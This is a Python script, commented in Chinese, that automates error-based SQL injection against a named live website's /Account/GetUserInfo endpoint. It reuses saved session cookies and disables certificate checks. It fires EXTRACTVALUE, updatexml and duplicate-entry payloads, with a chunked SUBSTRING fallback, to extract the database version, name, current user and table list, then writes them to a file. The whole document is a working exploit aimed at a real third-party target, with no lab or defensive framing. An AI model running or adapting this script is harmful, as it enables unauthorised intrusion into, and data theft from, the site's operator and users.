#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import time
import urllib3
urllib3.disable_warnings()

class VerifyDBExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def extract_with_error(self, query, label):
        """使用报错注入提取"""
        print(f"\n[*] 提取: {label}")
        
        payloads = [
            f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--",
            f"1' AND updatexml(1, CONCAT(0x7e, ({query}), 0x7e), 1)--",
            f"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
        
        for payload in payloads:
            url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                
                # 检查所有可能的错误格式
                patterns = [
                    r"XPATH syntax error: '~([^']+)~'",
                    r"'~([^']+)~'",
                    r"Duplicate entry '([^']+)'",
                    r"~([^~]+)~",
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, r.text, re.IGNORECASE)
                    if match:
                        value = match.group(1)
                        if value and len(value) > 0:
                            print(f"    [+] {label}: {value}")
                            return value
                
                # 检查是否在HTML注释中
                comments = re.findall(r'<!--.*?-->', r.text, re.DOTALL)
                for comment in comments:
                    if query.split()[1].lower() in comment.lower() or 'version' in comment.lower() or 'database' in comment.lower():
                        match = re.search(r"~([^~]+)~", comment)
                        if match:
                            value = match.group(1)
                            print(f"    [+] {label} (注释中): {value}")
                            return value
                
                # 检查响应体
                if query.split()[1].lower() in r.text.lower():
                    # 尝试提取
                    lines = r.text.split('\n')
                    for line in lines:
                        if 'version' in line.lower() or 'database' in line.lower() or 'user' in line.lower():
                            match = re.search(r'([a-zA-Z0-9_\.-]+)', line)
                            if match:
                                value = match.group(1)
                                if len(value) > 3 and value not in ['version', 'database', 'user']:
                                    print(f"    [+] {label} (响应中): {value}")
                                    return value
                
            except Exception as e:
                print(f"    [-] Error: {e}")
        
        return None
    
    def extract_with_substring(self, query, label, max_len=100):
        """分段提取"""
        print(f"\n[*] 分段提取: {label}")
        result = ""
        
        for i in range(1, max_len, 30):
            substring_query = f"SUBSTRING(({query}), {i}, 30)"
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({substring_query}), 0x7e))--"
            url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                
                # 提取值
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if not match:
                    match = re.search(r"'~([^']+)~'", r.text)
                if not match:
                    match = re.search(r"~([^~]+)~", r.text)
                
                if match:
                    chunk = match.group(1)
                    if chunk and len(chunk) > 0:
                        result += chunk
                        print(f"    [+] 片段 {i}: {chunk}")
                    else:
                        break
                else:
                    break
            except:
                break
            
            time.sleep(0.3)
        
        if result:
            print(f"    [+] 完整: {result}")
            return result
        return None
    
    def verify_and_extract(self):
        """验证并提取数据库"""
        print("="*60)
        print("验证数据库提取")
        print("="*60)
        
        # 提取版本
        version = self.extract_with_error("SELECT version()", "数据库版本")
        if version:
            self.db_info['version'] = version
        
        # 提取数据库名
        db_name = self.extract_with_error("SELECT database()", "数据库名")
        if db_name:
            self.db_info['database'] = db_name
        
        # 提取用户
        user = self.extract_with_error("SELECT user()", "当前用户")
        if user:
            self.db_info['user'] = user
        
        # 如果直接提取失败，尝试分段
        if not self.db_info.get('version'):
            version = self.extract_with_substring("SELECT version()", "数据库版本", max_len=50)
            if version:
                self.db_info['version'] = version
        
        if not self.db_info.get('database'):
            db_name = self.extract_with_substring("SELECT database()", "数据库名", max_len=50)
            if db_name:
                self.db_info['database'] = db_name
        
        # 提取表名
        if self.db_info.get('database'):
            tables = self.extract_with_substring(
                "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
                "表名列表",
                max_len=500
            )
            if tables:
                self.db_info['tables'] = tables.split(',') if ',' in tables else [tables]
        
        # 保存结果
        with open('db_extracted_verified.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("提取结果")
        print("="*60)
        for k, v in self.db_info.items():
            if isinstance(v, list):
                print(f"{k}: {len(v)} 项")
            else:
                print(f"{k}: {v}")
        
        return self.db_info

if __name__ == "__main__":
    extractor = VerifyDBExtract()
    extractor.verify_and_extract()